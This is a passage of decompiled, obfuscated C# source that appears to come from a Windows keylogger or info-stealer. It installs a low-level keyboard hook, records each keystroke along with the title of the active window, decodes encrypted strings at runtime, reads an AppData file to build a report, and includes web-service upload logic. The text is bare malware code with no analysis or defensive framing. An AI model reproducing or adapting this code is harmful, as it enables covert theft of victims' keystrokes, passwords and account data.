			}
			*(ushort*)((byte*)ptr + 60) = Convert.ToUInt16(decimal.Subtract(new decimal(Class42.smethod_9(Convert.ToInt32(decimal.Add(new decimal(ulong_0), new decimal(3L))), 2)), 1m));
			byte* num2 = (byte*)ptr + 44;
			*(int*)((byte*)ptr + 52) = *(ushort*)((byte*)ptr + 60);
			*(int*)num2 = 0;
			while (*(int*)((byte*)ptr + 44) <= *(int*)((byte*)ptr + 52))
			{
				checked
				{
					*unchecked((ushort*)((byte*)ptr + 58)) = (ushort)Class42.smethod_9(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ulong_0), new decimal(12L)), new decimal(*unchecked((int*)((byte*)ptr + 44)) * 2))), 2);
					if (decimal.Compare(new decimal(ulong_0), new decimal(100L)) == 0)
					{
						Class42.smethod_53(class10_0, Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(Class42.smethod_9(unchecked((int)(*(ushort*)((byte*)ptr + 58))), 4)), 1m), new decimal(Class10.ushort_0))));
					}
					else
					{
						Class42.smethod_53(class10_0, Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(Class42.smethod_9((int)(ulong_0 + *unchecked((ushort*)((byte*)ptr + 58))), 4)), 1m), new decimal(Class10.ushort_0))));
					}
					(*unchecked((int*)((byte*)ptr + 44)))++;
				}
			}
			Class42.smethod_53(class10_0, Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(Class42.smethod_9(Convert.ToInt32(decimal.Add(new decimal(ulong_0), new decimal(8L))), 4)), 1m), new decimal(Class10.ushort_0))));
		}
	}

	[DllImport("kernel32.Dll")]
	static extern short GetVersionEx(ref Class54.Struct25 struct25_0);

	static void smethod_54(Exception exception_0)
	{
		Class42.smethod_45(exception_0, new object[0]);
	}

	static void smethod_55(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4)
	{
		Class42.smethod_45(exception_0, new object[5] { object_0, object_1, object_2, object_3, object_4 });
	}

	static void smethod_56(Class30.Class33 class33_0, int int_0)
	{
		if (class33_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class33_0.byte_0[class33_0.int_0++] = (byte)int_0;
		class33_0.int_0 &= 32767;
	}

	static void smethod_57(IWebProxy iwebProxy_0, Class44 class44_0)
	{
		class44_0.iwebProxy_0 = iwebProxy_0;
	}

	static string smethod_58(int int_0, int int_1)
	{
		if (int_0 >= Class10.struct3_0.Length)
		{
			return null;
		}
		if (int_1 >= Class10.struct3_0[int_0].string_0.Length)
		{
			return null;
		}
		return Class10.struct3_0[int_0].string_0[int_1];
	}

	unsafe static long smethod_59(int int_0, int int_1)
	{
		void* ptr = stackalloc byte[41];
		int_0 = checked(int_0 + 1);
		byte[] array = new byte[8];
		*(int*)((byte*)ptr + 24) = checked(int_0 - int_1);
		((byte*)ptr)[40] = 0;
		if ((*(int*)((byte*)ptr + 24) == 0) | (*(int*)((byte*)ptr + 24) > 9))
		{
			*(long*)ptr = 0L;
		}
		else if (*(int*)((byte*)ptr + 24) == 1)
		{
			array[0] = checked((byte)(Class10.byte_0[int_1] & 0x7F));
			*(long*)ptr = BitConverter.ToInt64(array, 0);
		}
		else
		{
			if (*(int*)((byte*)ptr + 24) == 9)
			{
				((byte*)ptr)[40] = 1;
			}
			*(int*)((byte*)ptr + 16) = 1;
			*(int*)((byte*)ptr + 20) = 7;
			*(int*)((byte*)ptr + 28) = 0;
			if (((byte*)ptr)[40] != 0)
			{
				checked
				{
					array[0] = Class10.byte_0[int_0 - 1];
					int_0--;
				}
				*(int*)((byte*)ptr + 28) = 1;
			}
			byte* num = (byte*)ptr + 32;
			int num2 = checked(int_0 - 1);
			*(int*)((byte*)ptr + 36) = int_1;
			*(int*)num = num2;
			while (*(int*)((byte*)ptr + 32) >= *(int*)((byte*)ptr + 36))
			{
				checked
				{
					if (*unchecked((int*)((byte*)ptr + 32)) - 1 >= int_1)
					{
						array[*unchecked((int*)((byte*)ptr + 28))] = (byte)unchecked(((byte)((uint)Class10.byte_0[*(int*)((byte*)ptr + 32)] >> (checked(*unchecked((int*)((byte*)ptr + 16)) - 1) & 7)) & (255 >> *(int*)((byte*)ptr + 16))) | (byte)(Class10.byte_0[checked(*unchecked((int*)((byte*)ptr + 32)) - 1)] << (*(int*)((byte*)ptr + 20) & 7)));
						(*unchecked((int*)((byte*)ptr + 16)))++;
						(*unchecked((int*)((byte*)ptr + 28)))++;
						(*unchecked((int*)((byte*)ptr + 20)))--;
					}
					else if (unchecked((byte*)ptr)[40] == 0)
					{
						array[*unchecked((int*)((byte*)ptr + 28))] = (byte)unchecked((byte)((uint)Class10.byte_0[*(int*)((byte*)ptr + 32)] >> (checked(*unchecked((int*)((byte*)ptr + 16)) - 1) & 7)) & (255 >> *(int*)((byte*)ptr + 16)));
					}
					*unchecked((int*)((byte*)ptr + 32)) += -1;
				}
			}
			*(long*)ptr = BitConverter.ToInt64(array, 0);
		}
		*(long*)((byte*)ptr + 8) = *(long*)ptr;
		return *(long*)((byte*)ptr + 8);
	}

	unsafe static byte[] smethod_60(byte[] byte_0, byte[] byte_1)
	{
		void* ptr = stackalloc byte[14];
		*(int*)ptr = byte_0[checked(byte_0.Length - 1)];
		byte[] array = new byte[checked(byte_0.Length - 2 + 1)];
		*(short*)((byte*)ptr + 12) = 0;
		byte[] result;
		try
		{
			byte* num = (byte*)ptr + 4;
			*(int*)((byte*)ptr + 8) = checked(byte_0.Length - 2);
			*(int*)num = 0;
			while (*(int*)((byte*)ptr + 4) <= *(int*)((byte*)ptr + 8))
			{
				if (*(short*)((byte*)ptr + 12) >= byte_1.Length)
				{
					*(short*)((byte*)ptr + 12) = 0;
				}
				checked
				{
					if (*unchecked((int*)((byte*)ptr + 4)) < byte_0.Length - 1)
					{
						array[*unchecked((int*)((byte*)ptr + 4))] = Convert.ToByte(unchecked((int)byte_0[*(int*)((byte*)ptr + 4)]) - unchecked(array.Length % byte_1.Length) - unchecked((int)byte_1[*(short*)((byte*)ptr + 12)]) + *unchecked((int*)ptr));
						(*unchecked((short*)((byte*)ptr + 12)))++;
					}
					(*unchecked((int*)((byte*)ptr + 4)))++;
				}
			}
			result = array;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			result = array;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	static void smethod_61(EventHandler eventHandler_0, Class45 class45_0)
	{
		EventHandler eventHandler = class45_0.eventHandler_0;
		EventHandler eventHandler2;
		do
		{
			eventHandler2 = eventHandler;
			EventHandler value = (EventHandler)Delegate.Combine(eventHandler2, eventHandler_0);
			eventHandler = Interlocked.CompareExchange(ref class45_0.eventHandler_0, value, eventHandler2);
		}
		while ((object)eventHandler != eventHandler2);
	}

	unsafe static bool smethod_62(ulong ulong_0)
	{
		void* ptr = stackalloc byte[84];
		if (Class10.byte_0[checked((int)ulong_0)] == 13)
		{
			*(ushort*)((byte*)ptr + 76) = Convert.ToUInt16(decimal.Subtract(new decimal(Class42.smethod_9(Convert.ToInt32(decimal.Add(new decimal(ulong_0), new decimal(3L))), 2)), 1m));
			*(int*)((byte*)ptr + 36) = 0;
			checked
			{
				if (Class10.struct3_0 != null)
				{
					*unchecked((int*)((byte*)ptr + 36)) = Class10.struct3_0.Length;
					Class10.struct3_0 = (Class10.Struct3[])Utils.CopyArray((Array)Class10.struct3_0, (Array)new Class10.Struct3[Class10.struct3_0.Length + unchecked((int)(*(ushort*)((byte*)ptr + 76))) + 1]);
				}
				else
				{
					Class10.struct3_0 = new Class10.Struct3[unchecked((int)(*(ushort*)((byte*)ptr + 76))) + 1];
				}
			}
			byte* num = (byte*)ptr + 32;
			*(int*)((byte*)ptr + 64) = *(ushort*)((byte*)ptr + 76);
			*(int*)num = 0;
			Class10.Struct2[] array = default(Class10.Struct2[]);
			while (*(int*)((byte*)ptr + 32) <= *(int*)((byte*)ptr + 64))
			{
				checked
				{
					*unchecked((ulong*)ptr) = Class42.smethod_9(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ulong_0), new decimal(8L)), new decimal(*unchecked((int*)((byte*)ptr + 32)) * 2))), 2);
					if (decimal.Compare(new decimal(ulong_0), new decimal(100L)) != 0)
					{
						*unchecked((ulong*)ptr) = unchecked((ulong)(*(long*)ptr)) + ulong_0;
					}
					*unchecked((int*)((byte*)ptr + 44)) = Class42.smethod_128((int)(*unchecked((ulong*)ptr)));
					*unchecked((long*)((byte*)ptr + 16)) = Class42.smethod_59(*unchecked((int*)((byte*)ptr + 44)), (int)(*unchecked((ulong*)ptr)));
				}
				*(int*)((byte*)ptr + 40) = Class42.smethod_128(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(*(ulong*)ptr), decimal.Subtract(new decimal(*(int*)((byte*)ptr + 44)), new decimal(*(ulong*)ptr))), 1m)));
				Class10.struct3_0[checked(*unchecked((int*)((byte*)ptr + 36)) + *unchecked((int*)((byte*)ptr + 32)))].long_0 = Class42.smethod_59(*(int*)((byte*)ptr + 40), Convert.ToInt32(decimal.Add(decimal.Add(new decimal(*(ulong*)ptr), decimal.Subtract(new decimal(*(int*)((byte*)ptr + 44)), new decimal(*(ulong*)ptr))), 1m)));
				*(ulong*)ptr = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(*(ulong*)ptr), decimal.Subtract(new decimal(*(int*)((byte*)ptr + 40)), new decimal(*(ulong*)ptr))), 1m));
				*(int*)((byte*)ptr + 44) = Class42.smethod_128(checked((int)(*unchecked((ulong*)ptr))));
				*(int*)((byte*)ptr + 40) = *(int*)((byte*)ptr + 44);
				*(long*)((byte*)ptr + 8) = Class42.smethod_59(*(int*)((byte*)ptr + 44), checked((int)(*unchecked((ulong*)ptr))));
				*(long*)((byte*)ptr + 24) = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(*(ulong*)ptr), new decimal(*(int*)((byte*)ptr + 44))), 1m));
				*(int*)((byte*)ptr + 52) = 0;
				checked
				{
					while (unchecked(*(long*)((byte*)ptr + 24) < *(long*)((byte*)ptr + 8)))
					{
						array = (Class10.Struct2[])Utils.CopyArray((Array)array, (Array)new Class10.Struct2[*unchecked((int*)((byte*)ptr + 52)) + 1]);
						*unchecked((int*)((byte*)ptr + 44)) = *unchecked((int*)((byte*)ptr + 40)) + 1;
						unchecked
						{
							*(int*)((byte*)ptr + 40) = Class42.smethod_128(*(int*)((byte*)ptr + 44));
							array[*(int*)((byte*)ptr + 52)].long_1 = Class42.smethod_59(*(int*)((byte*)ptr + 40), *(int*)((byte*)ptr + 44));
						}
						if (array[*unchecked((int*)((byte*)ptr + 52))].long_1 > 9L)
						{
							if (Class42.smethod_101(array[*unchecked((int*)((byte*)ptr + 52))].long_1))
							{
								array[*unchecked((int*)((byte*)ptr + 52))].long_0 = (long)Math.Round((double)(array[*unchecked((int*)((byte*)ptr + 52))].long_1 - 13L) / 2.0);
							}
							else
							{
								array[*unchecked((int*)((byte*)ptr + 52))].long_0 = (long)Math.Round((double)(array[*unchecked((int*)((byte*)ptr + 52))].long_1 - 12L) / 2.0);
							}
						}
						else
						{
							array[*unchecked((int*)((byte*)ptr + 52))].long_0 = Class10.byte_1[(int)array[*unchecked((int*)((byte*)ptr + 52))].long_1];
						}
						*unchecked((long*)((byte*)ptr + 24)) = *unchecked((long*)((byte*)ptr + 24)) + (*unchecked((int*)((byte*)ptr + 40)) - *unchecked((int*)((byte*)ptr + 44))) + 1L;
						(*unchecked((int*)((byte*)ptr + 52)))++;
					}
					Class10.struct3_0[*unchecked((int*)((byte*)ptr + 36)) + *unchecked((int*)((byte*)ptr + 32))].string_0 = new string[array.Length - 1 + 1];
				}
				*(int*)((byte*)ptr + 48) = 0;
				byte* num2 = (byte*)ptr + 56;
				*(int*)((byte*)ptr + 68) = checked(array.Length - 1);
				*(int*)num2 = 0;
				checked
				{
					while (unchecked(*(int*)((byte*)ptr + 56) <= *(int*)((byte*)ptr + 68)))
					{
						if (array[*unchecked((int*)((byte*)ptr + 56))].long_1 > 9L)
						{
							if (!Class42.smethod_101(array[*unchecked((int*)((byte*)ptr + 56))].long_1))
							{
								if (decimal.Compare(new decimal(Class10.ulong_0), 1m) == 0)
								{
									Class10.struct3_0[*unchecked((int*)((byte*)ptr + 36)) + *unchecked((int*)((byte*)ptr + 32))].string_0[*unchecked((int*)((byte*)ptr + 56))] = Encoding.Default.GetString(Class10.byte_0, Convert.ToInt32(unchecked(decimal.Add(decimal.Add(new decimal(*(ulong*)ptr), new decimal(*(long*)((byte*)ptr + 8))), new decimal(*(int*)((byte*)ptr + 48))))), (int)array[*unchecked((int*)((byte*)ptr + 56))].long_0);
								}
								else if (decimal.Compare(new decimal(Class10.ulong_0), new decimal(2L)) == 0)
								{
									Class10.struct3_0[*unchecked((int*)((byte*)ptr + 36)) + *unchecked((int*)((byte*)ptr + 32))].string_0[*unchecked((int*)((byte*)ptr + 56))] = Encoding.Unicode.GetString(Class10.byte_0, Convert.ToInt32(unchecked(decimal.Add(decimal.Add(new decimal(*(ulong*)ptr), new decimal(*(long*)((byte*)ptr + 8))), new decimal(*(int*)((byte*)ptr + 48))))), (int)array[*unchecked((int*)((byte*)ptr + 56))].long_0);
								}
								else if (decimal.Compare(new decimal(Class10.ulong_0), new decimal(3L)) == 0)
								{
									Class10.struct3_0[*unchecked((int*)((byte*)ptr + 36)) + *unchecked((int*)((byte*)ptr + 32))].string_0[*unchecked((int*)((byte*)ptr + 56))] = Encoding.BigEndianUnicode.GetString(Class10.byte_0, Convert.ToInt32(unchecked(decimal.Add(decimal.Add(new decimal(*(ulong*)ptr), new decimal(*(long*)((byte*)ptr + 8))), new decimal(*(int*)((byte*)ptr + 48))))), (int)array[*unchecked((int*)((byte*)ptr + 56))].long_0);
								}
							}
							else
							{
								Class10.struct3_0[*unchecked((int*)((byte*)ptr + 36)) + *unchecked((int*)((byte*)ptr + 32))].string_0[*unchecked((int*)((byte*)ptr + 56))] = Encoding.Default.GetString(Class10.byte_0, Convert.ToInt32(unchecked(decimal.Add(decimal.Add(new decimal(*(ulong*)ptr), new decimal(*(long*)((byte*)ptr + 8))), new decimal(*(int*)((byte*)ptr + 48))))), (int)array[*unchecked((int*)((byte*)ptr + 56))].long_0);
							}
						}
						else
						{
							Class10.struct3_0[*unchecked((int*)((byte*)ptr + 36)) + *unchecked((int*)((byte*)ptr + 32))].string_0[*unchecked((int*)((byte*)ptr + 56))] = Conversions.ToString(Class42.smethod_9(Convert.ToInt32(unchecked(decimal.Add(decimal.Add(new decimal(*(ulong*)ptr), new decimal(*(long*)((byte*)ptr + 8))), new decimal(*(int*)((byte*)ptr + 48))))), (int)array[*unchecked((int*)((byte*)ptr + 56))].long_0));
						}
						*unchecked((int*)((byte*)ptr + 48)) = (int)(*unchecked((int*)((byte*)ptr + 48)) + array[*unchecked((int*)((byte*)ptr + 56))].long_0);
						(*unchecked((int*)((byte*)ptr + 56)))++;
					}
					(*unchecked((int*)((byte*)ptr + 32)))++;
				}
			}
		}
		else if (Class10.byte_0[checked((int)ulong_0)] == 5)
		{
			*(ushort*)((byte*)ptr + 80) = Convert.ToUInt16(decimal.Subtract(new decimal(Class42.smethod_9(Convert.ToInt32(decimal.Add(new decimal(ulong_0), new decimal(3L))), 2)), 1m));
			byte* num3 = (byte*)ptr + 60;
			*(int*)((byte*)ptr + 72) = *(ushort*)((byte*)ptr + 80);
			*(int*)num3 = 0;
			while (*(int*)((byte*)ptr + 60) <= *(int*)((byte*)ptr + 72))
			{
				checked
				{
					*unchecked((ushort*)((byte*)ptr + 78)) = (ushort)Class42.smethod_9(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ulong_0), new decimal(12L)), new decimal(*unchecked((int*)((byte*)ptr + 60)) * 2))), 2);
					Class42.smethod_62(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(Class42.smethod_9((int)(ulong_0 + *unchecked((ushort*)((byte*)ptr + 78))), 4)), 1m), new decimal(Class10.ushort_0))));
					(*unchecked((int*)((byte*)ptr + 60)))++;
				}
			}
			Class42.smethod_62(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(Class42.smethod_9(Convert.ToInt32(decimal.Add(new decimal(ulong_0), new decimal(8L))), 4)), 1m), new decimal(Class10.ushort_0))));
		}
		((byte*)ptr)[82] = 1;
		((byte*)ptr)[83] = ((byte*)ptr)[82];
		return ((byte*)ptr)[83] != 0;
	}

	static void smethod_63(Class30.Class32 class32_0, int int_0)
	{
		class32_0.uint_0 >>= int_0;
		class32_0.int_2 -= int_0;
	}

	static Class30.Class34 smethod_64(Class30.Class35 class35_0)
	{
		byte[] array = new byte[class35_0.int_4];
		Array.Copy(class35_0.byte_1, class35_0.int_3, array, 0, class35_0.int_4);
		return new Class30.Class34(array);
	}

	static void smethod_65(EventArgs1 eventArgs1_0, bool bool_0)
	{
		eventArgs1_0.bool_2 = bool_0;
	}

	unsafe static int smethod_66(int int_0, int int_1, ref Class13.Struct5 struct5_0)
	{
		void* ptr = stackalloc byte[16];
		try
		{
			string text = Class42.smethod_22(Class42.GetForegroundWindow());
			if (Operators.CompareString(text, Class13.string_1, false) != 0)
			{
				Class13.string_1 = text;
				Class5.string_12 = Class5.string_12 + Environment.NewLine + Class42.smethod_161("hXOKhHZXcn2EdldyfYR2V3J9hHZXcn2EdldyfYR2V3J9Hw==", "False") + text + Class42.smethod_161("aoWQl4lqhZCXiWqFkJeJaoWQl4lqhZCXiWqFkJeJd4bADA==", "False") + Environment.NewLine + Environment.NewLine;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text2 = "";
			if (int_1 == 256 || int_1 == 260)
			{
				checked
				{
					switch (struct5_0.int_0)
					{
					case 8:
						Class5.string_12 = Class5.string_12.Substring(0, Class5.string_12.Length - 1);
						break;
					case 9:
						text2 = char.ConvertFromUtf32(9);
						break;
					case 13:
						text2 = Environment.NewLine;
						break;
					case 20:
						text2 = ((!Control.IsKeyLocked((Keys)20)) ? Class42.smethod_161("Q5mMkZJ2XpWfhW5emJ6fQyQ=", "False") : Class42.smethod_161("QpiLkJF1XZSehG1dl5WHf10m", "False"));
						break;
					case 27:
						text2 = Class42.smethod_161("S6GWy62IZh0=", "False");
						break;
					case 32:
						text2 = Class42.smethod_161("RyA=", "False");
						break;
					case 35:
						text2 = Class42.smethod_161("R52SwqqEYiE=", "False");
						break;
					case 36:
						text2 = Class42.smethod_161("WrCo1safsoAP", "False");
						break;
					case 37:
						text2 = Class42.smethod_161("U6mVvXIT", "False");
						break;
					case 38:
						text2 = Class42.smethod_161("SJ6ssmce", "False");
						break;
					case 39:
						text2 = Class42.smethod_161("X7WjyX4H", "False");
						break;
					case 40:
						text2 = Class42.smethod_161("O5GXpVor", "False");
						break;
					case 46:
						text2 = Class42.smethod_161("WrCkzMWXdQ4=", "False");
						break;
					case 48:
					case 49:
					case 50:
					case 51:
					case 52:
					case 53:
					case 54:
					case 55:
					case 56:
					case 57:
						if (((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown())
						{
							string text3 = Class42.smethod_161("YnynjoNhgIeTgJ98jY6KYYSHlwk=", "False");
							string[] array = text3.Split(new char[1] { Conversions.ToChar(Class42.smethod_161("VBM=", "False")) });
							switch (struct5_0.int_0)
							{
							case 48:
								text2 = array[9];
								break;
							case 49:
								text2 = array[0];
								break;
							case 50:
								text2 = array[1];
								break;
							case 51:
								text2 = array[2];
								break;
							case 52:
								text2 = array[3];
								break;
							case 53:
								text2 = array[4];
								break;
							case 54:
								text2 = array[5];
								break;
							case 55:
								text2 = array[6];
								break;
							case 56:
								text2 = array[7];
								break;
							case 57:
								text2 = array[8];
								break;
							}
						}
						else
						{
							text2 = char.ConvertFromUtf32(struct5_0.int_0);
						}
						break;
					case 65:
					case 66:
					case 67:
					case 68:
					case 69:
					case 70:
					case 71:
					case 72:
					case 73:
					case 74:
					case 75:
					case 76:
					case 77:
					case 78:
					case 79:
					case 80:
					case 81:
					case 82:
					case 83:
					case 84:
					case 85:
					case 86:
					case 87:
					case 88:
					case 89:
					case 90:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? char.ConvertFromUtf32(struct5_0.int_0 + 32).ToLower() : char.ConvertFromUtf32(struct5_0.int_0 + 32).ToUpper());
						break;
					case 112:
					case 113:
					case 114:
					case 115:
					case 116:
					case 117:
					case 118:
					case 119:
					case 120:
					case 121:
					case 122:
					case 123:
					case 124:
					case 125:
					case 126:
					case 127:
					case 128:
					case 129:
					case 130:
					case 131:
					case 132:
					case 133:
					case 134:
					case 135:
						text2 = Class42.smethod_161("UaedGA==", "False") + Conversions.ToString(struct5_0.int_0 - 111) + Class42.smethod_161("o4EC", "False");
						break;
					case 162:
					case 163:
						text2 = Class42.smethod_161("Vaue0cKpwsrOsVUS", "False");
						break;
					case 164:
					case 165:
						text2 = Class42.smethod_161("RJqLvbeBXyQ=", "False");
						break;
					case 186:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class42.smethod_161("cBI=", "False") : Class42.smethod_161("axY=", "False"));
						break;
					case 187:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class42.smethod_161("WSs=", "False") : Class42.smethod_161("bAY=", "False"));
						break;
					case 188:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class42.smethod_161("YhE=", "False") : Class42.smethod_161("XCc=", "False"));
						break;
					case 189:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class42.smethod_161("cAQ=", "False") : Class42.smethod_161("eC4=", "False"));
						break;
					case 190:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class42.smethod_161("ZRA=", "False") : Class42.smethod_161("bRg=", "False"));
						break;
					case 191:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class42.smethod_161("aQ0=", "False") : Class42.smethod_161("gQU=", "False"));
						break;
					case 192:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class42.smethod_161("lBM=", "False") : Class42.smethod_161("vQg=", "False"));
						break;
					default:
						text2 = char.ConvertFromUtf32(struct5_0.int_0);
						break;
					case 219:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class42.smethod_161("mgg=", "False") : Class42.smethod_161("wAI=", "False"));
						break;
					case 220:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class42.smethod_161("czA=", "False") : Class42.smethod_161("vwQ=", "False"));
						break;
					case 221:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class42.smethod_161("gSM=", "False") : Class42.smethod_161("rBg=", "False"));
						break;
					case 222:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class42.smethod_161("bQE=", "False") : Class42.smethod_161("Ths=", "False"));
						break;
					}
					Class5.string_12 += text2;
					Class5.string_24 = Class5.string_12;
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		*(int*)((byte*)ptr + 12) = *(int*)ptr;
		return *(int*)((byte*)ptr + 12);
	}

	static void smethod_67(ref double double_0)
	{
		try
		{
			DateTime t = DateAndTime.get_Now().AddSeconds(double_0);
			while (DateTime.Compare(DateAndTime.get_Now(), t) < 0)
			{
				Application.DoEvents();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetWindowTextA(int int_0, StringBuilder stringBuilder_0, int int_1);

	static void smethod_68()
	{
		try
		{
			string string_ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("jpDH0bZ4oai7xJvBvdJ/m7HQFw==", "False");
			string text = Class42.smethod_17(string_);
			string text2 = Class42.smethod_29(Class42.smethod_161("iaesx7+EsbnApY+wxsOzhq7Dwc+n0N7P0qa4rcKwmL3Z07yEq7mzppWsw8HJtcHaygk=", "False") + text + Class42.smethod_161("k5rM18oP", "False"));
			string text3 = Class42.smethod_29(Class42.smethod_161("jqyxzMSJtr7FqpS1y8i4i7PIxtSs1ePU16u9sse1ncLe2MGJsL64q5qxyMbOusbfzwQ=", "False") + text + Class42.smethod_161("jp3H0cUU", "False"));
			string text4 = Class42.smethod_29(Class42.smethod_161("d5Wata1yn6euk32etLGhdJyxr72Vvsy9wJSmm7CehqvHwapymaehlIOasa+3o6/IuBs=", "False") + text + Class42.smethod_161("ma3Wz84J", "False"));
			string text5 = Class42.smethod_29(Class42.smethod_161("bIqPqqJnlJyjiHKTqaaWaZGmpLKKs8GytYmbkKWTe6C8tp9njpyWiXiPpqSsmKS9rSY=", "False") + text + Class42.smethod_161("g5KkIg==", "False"));
			string text6 = Class42.smethod_29(Class42.smethod_161("jKqvysKHtLzDqJKzyca2ibHGxNKq0+HS1am7sMWzm8Dc1r+Hrry2qZivxsTMuMTdzQY=", "False") + text + Class42.smethod_161("g5Cuwasf", "False"));
			string text7 = (Class5.string_1 = ((Operators.CompareString(text4, "", false) == 0) ? (Class42.smethod_161("fJeiqZt8l6Kpm3yXqNvQpKC5vJt8l6Kpm3yXoqmbfJeiCg==", "False") + Environment.NewLine + Environment.NewLine + Class42.smethod_161("frrKxbiesnajvqW5uhk=", "False") + Environment.NewLine + Environment.NewLine + Class42.smethod_161("bIeSmYtsh5KZi2yHkpmLbIeSmYtsh5KZi2yHkpmLbIcZ", "False")) : (Class42.smethod_161("fJeiqZt8l6Kpm3yXqNvQpKC5vJt8l6Kpm3yXoqmbfJeiCg==", "False") + Environment.NewLine + Environment.NewLine + Class42.smethod_161("XKCxtq9RUjE=", "False") + text6 + Environment.NewLine + Class42.smethod_161("aqy7w3tCJQ==", "False") + text2 + Class42.smethod_161("axY=", "False") + text3 + Environment.NewLine + Class42.smethod_161("bKWitqR4n6J+Vi8=", "False") + text4 + Environment.NewLine + Class42.smethod_161("cJy5wLaPraqHXyY=", "False") + text5 + Class42.smethod_161("O16Gtp2Nr7G8Yys=", "False") + Environment.NewLine + Environment.NewLine + Class42.smethod_161("b4qVnI5vipWcjm+KlZyOb4qVnI5vipWcjm+KlZyOb4oW", "False"))));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Class5.string_1 = "";
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_69(Class45 class45_0, Delegate1 delegate1_0)
	{
		Delegate1 @delegate = class45_0.delegate1_0;
		Delegate1 delegate2;
		do
		{
			delegate2 = @delegate;
			Delegate1 value = (Delegate1)Delegate.Combine(delegate2, delegate1_0);
			@delegate = Interlocked.CompareExchange(ref class45_0.delegate1_0, value, delegate2);
		}
		while ((object)@delegate != delegate2);
	}

	unsafe static bool smethod_70(int int_0, Class30.Class37 class37_0, int int_1)
	{
		void* ptr = stackalloc byte[9];
		class37_0.short_0[class37_0.int_1] = (short)int_1;
		class37_0.byte_1[class37_0.int_1++] = (byte)(int_0 - 3);
		*(int*)ptr = Class42.smethod_153(class37_0, int_0 - 3);
		short[] short_;
		short[] array = (short_ = class37_0.class38_0.short_0);
		int num = *(int*)ptr;
		nint num2 = num;
		array[num] = (short)(short_[num2] + 1);
		if (*(int*)ptr >= 265 && *(int*)ptr < 285)
		{
			class37_0.int_2 += (*(int*)ptr - 261) / 4;
		}
		*(int*)((byte*)ptr + 4) = Class42.smethod_131(class37_0, int_1 - 1);
		short[] array2 = (short_ = class37_0.class38_1.short_0);
		int num3 = *(int*)((byte*)ptr + 4);
		num2 = num3;
		array2[num3] = (short)(short_[num2] + 1);
		if (*(int*)((byte*)ptr + 4) >= 4)
		{
			class37_0.int_2 += *(int*)((byte*)ptr + 4) / 2 - 1;
		}
		((byte*)ptr)[8] = (Class42.smethod_111(class37_0) ? ((byte)1) : ((byte)0));
		return ((byte*)ptr)[8] != 0;
	}

	static void smethod_71(Class53 class53_0, Delegate3 delegate3_0)
	{
		if (class53_0.string_2 == null)
		{
			try
			{
				UploadReportLoginService uploadReportLoginService = new UploadReportLoginService();
				if (class53_0.iwebProxy_0 != null)
				{
					((HttpWebClientProtocol)uploadReportLoginService).set_Proxy(class53_0.iwebProxy_0);
				}
				class53_0.string_2 = uploadReportLoginService.GetServerURL(class53_0.string_1);
				if (class53_0.string_2.Length == 0)
				{
					throw new ApplicationException("Cannot connect to webservice");
				}
				if (class53_0.string_2 == "ditto")
				{
					class53_0.string_2 = Class53.string_0;
				}
			}
			catch (Exception ex)
			{
				delegate3_0("ERR 2001: " + ex.Message);
				return;
			}
		}
		delegate3_0(class53_0.string_2.StartsWith("ERR") ? class53_0.string_2 : "OK");
	}

	static bool smethod_72(Class30.Class40 class40_0)
	{
		return class40_0.int_1 == 0;
	}

	static bool smethod_73(Class30.Class36 class36_0)
	{
		if (class36_0.int_0 == 30)
		{
			return Class42.smethod_72(class36_0.class40_0);
		}
		return false;
	}

	static Exception smethod_74(EventArgs0 eventArgs0_0)
	{
		return eventArgs0_0.exception_0;
	}

	static void smethod_75()
	{
		try
		{
			Class13.delegate0_0 = Class42.smethod_66;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class13.intptr_0 = (IntPtr)Class42.SetWindowsHookExA(13, Class13.delegate0_0, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
		}
		catch (Exception projectError2)
		{
